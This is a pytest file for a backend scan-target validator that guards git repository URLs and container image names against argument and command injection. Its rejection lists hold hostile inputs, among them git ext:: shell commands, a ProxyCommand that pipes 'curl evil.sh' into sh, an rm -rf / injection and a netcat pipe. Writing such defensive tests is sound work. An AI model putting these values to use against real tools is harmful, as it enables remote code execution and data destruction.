"""Tests for backend-side scan-target validation (API-boundary argv-injection guard).

Mirrors ``scanner/tests/test_target_validation.py``; the backend copy is the
early user-facing 400, the scanner copy is the authoritative security boundary.
"""
from __future__ import annotations

import pytest

from app.services.scan_target_validation import (
    UnsafeScanTarget,
    validate_container_image_target,
    validate_scan_target,
    validate_source_repo_target,
)


_MALICIOUS_REPO_TARGETS = [
    "ext::sh -c 'touch /tmp/pwned'",
    "fd::17/foo",
    "--upload-pack=touch /tmp/pwned",
    "-oProxyCommand=curl evil.sh|sh",
    "file:///etc/passwd",
    "/etc/passwd",
    "git@github.com:org/repo.git",
    "https://exa mple.com/r",
    "",
    "javascript://alert(1)",
    "https://",
]


@pytest.mark.parametrize("target", _MALICIOUS_REPO_TARGETS)
def test_source_repo_targets_are_rejected(target):
    with pytest.raises(UnsafeScanTarget):
        validate_source_repo_target(target)
    with pytest.raises(UnsafeScanTarget):
        validate_scan_target(target, "source_repo")


_SAFE_REPO_TARGETS = [
    "https://github.com/owner/repo",
    "https://github.com/owner/repo.git",
    "http://gitea.internal/owner/repo.git",
    "https://dev.azure.com/org/proj/_git/ANK%C3%96",
    "git://git.example.com/repo.git",
    "ssh://git@github.com/owner/repo.git",
    "https://user:token@github.com/owner/repo.git",
]


@pytest.mark.parametrize("target", _SAFE_REPO_TARGETS)
def test_legitimate_repo_targets_are_accepted(target):
    validate_source_repo_target(target)
    validate_scan_target(target, "source_repo")


_MALICIOUS_IMAGE_TARGETS = [
    "-v",
    "docker://evil",
    "ext::sh -c x",
    "alpine; rm -rf /",
    "alpine`whoami`",
    "alpine$(whoami)",
    "alpine|nc evil 1",
    "img\nribbon",
    "",
]


@pytest.mark.parametrize("target", _MALICIOUS_IMAGE_TARGETS)
def test_image_targets_are_rejected(target):
    with pytest.raises(UnsafeScanTarget):
        validate_container_image_target(target)
    with pytest.raises(UnsafeScanTarget):
        validate_scan_target(target, "container_image")


_SAFE_IMAGE_TARGETS = [
    "alpine",
    "alpine:3.19",
    "library/nginx:1.27",
    "ghcr.io/owner/hecate-backend:latest",
    "ghcr.io/owner/img@sha256:" + "a" * 64,
    "registry.example.com:5000/team/app:1.2.3",
]


@pytest.mark.parametrize("target", _SAFE_IMAGE_TARGETS)
def test_legitimate_image_targets_are_accepted(target):
    validate_container_image_target(target)
    validate_scan_target(target, "container_image")


def test_unknown_type_is_not_validated():
    validate_scan_target("anything at all -- ::", "sbom-import")


def test_unsafe_scan_target_is_a_value_error():
    # The API layer catches ValueError -> HTTP 400; UnsafeScanTarget must inherit it.
    assert issubclass(UnsafeScanTarget, ValueError)
